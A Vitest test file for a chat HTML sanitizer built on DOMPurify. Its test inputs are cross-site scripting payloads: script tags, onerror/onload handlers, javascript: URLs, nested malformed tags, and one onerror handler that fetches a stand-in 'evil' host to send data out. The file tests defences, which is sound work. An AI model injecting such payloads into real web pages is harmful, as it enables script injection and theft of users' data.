import { describe, it, expect } from 'vitest';
import DOMPurify from 'dompurify';
import { escapeHtml, sanitizeChatHtml } from '../sanitize-chat-html';

describe('sanitizeChatHtml', () => {
  it('strips script tags and their contents', () => {
    const out = sanitizeChatHtml('<b>hi</b><script>alert(1)</script>');
    expect(out).toContain('hi');
    expect(out).not.toContain('script');
    expect(out).not.toContain('alert');
  });

  it('removes inline event handlers', () => {
    const out = sanitizeChatHtml('<img src=x onerror="fetch(\'//evil/?t=1\')">');
    expect(out).not.toContain('onerror');
    expect(out).not.toContain('fetch');
  });

  it('removes javascript: and data: URLs from href', () => {
    expect(sanitizeChatHtml('<a href="javascript:alert(1)">x</a>')).not.toContain('javascript');
    expect(sanitizeChatHtml('<a href="data:text/html,<script>alert(1)</script>">x</a>')).not.toContain(
      'data:text/html',
    );
  });

  it('drops iframe, object, embed, form and style entirely', () => {
    for (const tag of ['iframe', 'object', 'embed', 'form', 'style', 'link', 'meta']) {
      const out = sanitizeChatHtml(`<${tag}>x</${tag}>`);
      expect(out.toLowerCase()).not.toContain(`<${tag}`);
    }
  });

  it('keeps the formatting the backend legitimately emits', () => {
    const out = sanitizeChatHtml('<b>Balance</b>: <i>$10</i><br>done');
    expect(out).toContain('<b>Balance</b>');
    expect(out).toContain('<i>$10</i>');
    expect(out).toContain('<br');
  });

  it('preserves text content of a plain sentence', () => {
    expect(sanitizeChatHtml('hello there')).toBe('hello there');
  });

  it('escapes rather than interprets a bare tag-looking string', () => {
    const out = sanitizeChatHtml('5 < 10 and 10 > 5');
    expect(out).toContain('5');
    expect(out).toContain('10');
  });

  it('hardens external links with rel and target', () => {
    const out = sanitizeChatHtml('<a href="https://example.com">site</a>');
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('_blank');
    expect(out).toContain('noopener');
    expect(out).toContain('noreferrer');
  });

  it('handles empty and nullish input', () => {
    expect(sanitizeChatHtml('')).toBe('');
    expect(sanitizeChatHtml(null)).toBe('');
    expect(sanitizeChatHtml(undefined)).toBe('');
  });

  it('is not fooled by nested or malformed payloads', () => {
    const payloads = [
      '<scr<script>ipt>alert(1)</script>',
      '<img src="x" onerror=alert(1)//>',
      '"><img src=x onerror=alert(1)>',
      '<svg/onload=alert(1)>',
      '<body onload=alert(1)>',
      '<a href="#" onmouseover="alert(1)">x</a>',
    ];
    for (const p of payloads) {
      const out = sanitizeChatHtml(p).toLowerCase();
      expect(out).not.toContain('onerror');
      expect(out).not.toContain('onload');
      expect(out).not.toContain('onmouseover');
      expect(out).not.toContain('<script');
      expect(out).not.toContain('<svg');
    }
  });

  it('strips the style attribute but keeps the element', () => {
    const out = sanitizeChatHtml('<p style="position:fixed;top:0">x</p>');
    expect(out.toLowerCase()).not.toContain('position:fixed');
    expect(out.toLowerCase()).toContain('<p');
  });

  it('fails closed when no DOM is available', () => {
    // dompurify.isSupported is false during SSR. Markup must be escaped there,
    // never passed through — a regression would reintroduce the XSS on the
    // server render path.
    const original = DOMPurify.isSupported;
    try {
      (DOMPurify as { isSupported: boolean }).isSupported = false;
      const out = sanitizeChatHtml('<img src=x onerror="alert(1)">');
      expect(out).not.toContain('<img');
      expect(out).toContain('&lt;img');
    } finally {
      (DOMPurify as { isSupported: boolean }).isSupported = original;
    }
  });

  it('still sanitises normally once a DOM is present', () => {
    const out = sanitizeChatHtml('<b>ok</b><script>alert(1)</script>');
    expect(out).toContain('<b>ok</b>');
    expect(out).not.toContain('script');
  });
});

describe('escapeHtml', () => {
  it('escapes the five significant characters', () => {
    expect(escapeHtml(`<a href="x">&'`)).toBe('&lt;a href=&quot;x&quot;&gt;&amp;&#39;');
  });

  it('is safe on nullish input', () => {
    expect(escapeHtml(null)).toBe('');
    expect(escapeHtml(undefined)).toBe('');
  });
});
